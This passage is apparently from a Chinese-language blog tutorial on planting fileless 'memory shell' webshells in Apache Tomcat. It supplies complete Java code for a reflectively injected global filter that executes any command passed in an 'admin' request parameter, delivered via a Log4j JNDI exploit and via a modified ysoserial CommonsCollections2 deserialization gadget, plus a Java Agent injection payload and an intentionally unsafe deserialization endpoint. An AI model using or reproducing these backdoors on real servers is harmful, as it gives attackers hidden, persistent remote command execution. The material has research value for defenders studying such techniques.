class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="构造Exploit"><a href="#构造Exploit" class="headerlink" title="构造Exploit"></a>构造Exploit</h3><p>我们只尝试增加Filter，增加Servlet和Listener的方法也比较相似，不重复讨论</p>
<p>接下来按照我之前的CVE-2021-44228分析中的方法触发JNDI漏洞，我们将反弹Shell的代码进行修改</p>
<p>这时候遇到一个难点，之前我们使用JSP获取内存马，可以发现，往Tomcat中注入内存马的核心是需要获取到StandardContext实例，之前JSP会自动放进去一个request对象，可以用于获取StandardContext，但是此时没有这个便捷的方式，所以我们要另寻出入了</p>
<p>参考这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">Java内存马：一种Tomcat全版本获取StandardContext的新方法 - 先知社区 (aliyun.com)</a></p>
<p>由于我们使用Tomcat9，此处我们使用”从ContextClassLoader获取”的方式为例来获取<code>StandardContext</code>，代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure>

<p>整合Exploit，代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BackdoorFilter</span> <span class="keyword">extends</span> <span class="title">HttpFilter</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">                <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(req, res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String name = <span class="string">&quot;BackdoorFilter&quot;</span>;</span><br><span class="line">        <span class="comment">// 从ContextClassLoader获取StandardContext</span></span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">        Field field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">            BackdoorFilter filter = <span class="keyword">new</span> BackdoorFilter();</span><br><span class="line">            <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">            FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">            filterConfigs.put(name, filterConfig);</span><br><span class="line">            <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">            FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">            filterMap.setFilterName(name);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先触发log4j漏洞，利用JNDI执行我们的Exploit植入内存马，随后访问任意URL时带上admin参数即可执行命令</p>
<p>可以发现，在这种情况下，我们实现了真正的<strong>无文件落地</strong>，但是JNDI+LDAP的攻击方式在jdk 8u191及之后就无法利用了，下一节我们讨论基于反序列化的植入方法</p>
<h2 id="基于反序列化的内存马植入-ysoserial-CommonsCollections2改造"><a href="#基于反序列化的内存马植入-ysoserial-CommonsCollections2改造" class="headerlink" title="基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造"></a>基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造</h2><blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com)</a></p>
</blockquote>
<p>由于CommonsCollections2使用了TemplatesImpl，所以我们才能用这个方法进行内存马注入，像CommonsCollections1没有利用TemplatesImpl，所以就不行了</p>
<h3 id="配置反序列化环境"><a href="#配置反序列化环境" class="headerlink" title="配置反序列化环境"></a>配置反序列化环境</h3><p>我们写一个进行反序列化的接口，放在<code>doPost()</code>里面，核心代码只需一句</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> ObjectInputStream((request.getInputStream()))).readObject();</span><br></pre></td></tr></table></figure>

<p>我们使用CommonsCollections2作为例子，通过Maven引入<code>commons-collections4:4.0</code></p>
<p>测试一下环境是否正常</p>
<p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194726803.png" alt="image-20220126194726803"></p>
<p>会报错，但是我们可以发现是<code>TemplatesImpl</code>抛出的，并且检查命令执行效果可以发现命令执行成功了，接下来开始改造Payload</p>
<h3 id="构造Exploit-1"><a href="#构造Exploit-1" class="headerlink" title="构造Exploit"></a>构造Exploit</h3><p>首先是用IDEA导入ysoserial项目，项目的Jdk版本设置为1.8。</p>
<p>由于打包起来太麻烦，我们将<code>ysoserial.GeneratePayload</code>作为主类运行，直接生成Payload</p>
<p>由于我们要输出到文件中，修改<code>GeneraterPayload.java</code>的第35行<code>PrintStream out = System.out;</code>改为<code>PrintStream out = new PrintStream(&quot;./output.serial&quot;);</code></p>
<p>首先在<code>ysoserial.payloads.util.Gadgets.java</code>中调整<code>createTemplateImpl</code>函数</p>
<p>由于原版的<code>createTemplateImpl</code>根据要执行的指令来生成<code>TemplateImpl</code>我们将其重载并稍微修改一下    </p>
<p>我们复制<code>createTemplateImpl</code>并改为如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> Class _class )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            _class,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(_class, TemplatesImpl.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> Class _class, Class&lt;T&gt; tplClass, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = ClassFiles.classAsBytes(_class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于第一处重载，只是把<code>command</code>改为了<code>_class</code>并删除了无用的参数，第二处重载则从通过Javaassist技术制作类并获取字节码变为直接获取字节码，因为我们直接编写了类文件</p>
<p>然后将<code>payloads/CommonsCollections2</code>复制出一个新版本，命名为<code>CommonsCollections2ForClassInjection</code></p>
<p>将<code>command</code>参数重构为<code>payloadName</code>，变为注入的类名来使用，之后可以方便调整为使用<code>ServletInjection</code>等其它内存马</p>
<p>把这一句进行修改</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure>

<p>换为如下，直接通过类名获取字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(Class.forName(<span class="string">&quot;ysoserial.shells.&quot;</span>+payloadName));</span><br></pre></td></tr></table></figure>

<p>启动参数配置如下</p>
<p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194823501.png" alt="image-20220126194823501"></p>
<p>将生成的<code>output.serial</code>文件打到服务器上，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p>
<p>可以发现我给自己起的Payload名字是<code>TomcatFilterInjection</code>，把它放在如图的位置</p>
<p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194842825.png" alt="image-20220126194842825"></p>
<p>Payload代码如下，大家也可以自己制作<code>ServletInjection</code>或者<code>ListenerInjection</code>作为Payload</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatFilterInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            String name = <span class="string">&quot;TomcatFilterInjection&quot;</span>;</span><br><span class="line">            <span class="comment">// 从ContextClassLoader获取StandardContext</span></span><br><span class="line">            WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">            Field field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">                TomcatFilterInjection filter = <span class="keyword">new</span> TomcatFilterInjection();</span><br><span class="line">                <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">                FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">                filterDef.setFilterName(name);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">                filterConfigs.put(name, filterConfig);</span><br><span class="line">                <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">                FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">                filterMap.setFilterName(name);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 忽略错误，在生成生成序列化代码时也会执行static部分，必然报错，直接跳过即可</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res,</span></span></span><br><span class="line"><span class="params"><span class="function">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><blockquote>
<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9450">Java Agent 从入门到内存马 - 先知社区 (aliyun.com)</a></p>
</blockquote>
<p>还是以Tomcat为例，我们知道JavaAgent技术可以动态修改字节码，我们熟知的Burp Suite的破解技术就是基于<code>premain</code>方法实现的，通过<code>agentmain</code>，我们可以直接修改关键类即可</p>
<p>由于Java Agent内存马需要有Jar文件落地，并不是比JSP更好的方法，只能说在JSP无法解析的时候适用性会更好一些</p>
<p>比较知名的冰蝎就提供了Java Agent内存马，我们也实现一个比较基础的</p>
<p>调用端(Attacher)的核心代码其实就3句话</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachine virtualMachine = VirtualMachine.attach(id);</span><br><span class="line">virtualMachine.loadAgent(jarName);</span><br><span class="line">virtualMachine.detach();</span><br></pre></td></tr></table></figure>

<p>我们可以使用前面研究过的JNDI注入方法进行注入，也可以利用反序列化，只要能够执行Java代码即可，甚至拿到系统Shell后直接用命令执行<code>loadAgent</code>的另一个java程序也可以，只是要上传更多的文件，风险更大</p>
<p>这里方便起见，直接继续使用前面研究的反序列化注入方法进行攻击，我们在<code>shells</code>中增加一个新的Payload，代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> sun.management.VMManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.RuntimeMXBean;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取进程ID</span></span><br><span class="line">            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();</span><br><span class="line">            Field jvm = runtime.getClass().getDeclaredField(<span class="string">&quot;jvm&quot;</span>);</span><br><span class="line">            jvm.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            VMManagement mgmt = (VMManagement) jvm.get(runtime);</span><br><span class="line">            Method pidMethod = mgmt.getClass().getDeclaredMethod(<span class="string">&quot;getProcessId&quot;</span>);</span><br><span class="line">            pidMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">// attach到当前JVM</span></span><br><span class="line">            VirtualMachine virtualMachine = VirtualMachine.attach(String.valueOf(pidMethod.invoke(mgmt)));</span><br><span class="line">            <span class="comment">// 加载agent，可以从远程下载再load，这里直接从本地load了</span></span><br><span class="line">            virtualMachine.loadAgent(<span class="string">&quot;/tmp/agent.jar&quot;</span>);</span><br><span class="line">            virtualMachine.detach();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>src/main/resources/</code>目录下创建<code>META-INF/MANIFEST.MF</code>，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure>

<p>打包成<code>.jar</code>，发送序列化数据，结果遇到异常</p>
<p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126195048536.png" alt="image-20220126195048536"></p>
